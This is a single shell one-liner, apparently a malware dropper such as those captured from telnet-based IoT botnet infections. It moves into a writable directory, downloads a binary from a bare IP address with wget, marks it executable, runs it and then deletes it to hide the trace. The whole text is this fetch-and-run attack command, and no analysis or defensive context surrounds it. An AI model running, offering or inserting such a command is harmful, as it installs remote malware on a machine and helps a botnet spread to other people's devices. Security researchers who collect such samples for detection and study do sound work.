cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.249.148.11/cuntytelnetd; chmod +x cuntytelnetd; ./cuntytelnetd; rm -rf cuntytelnetd
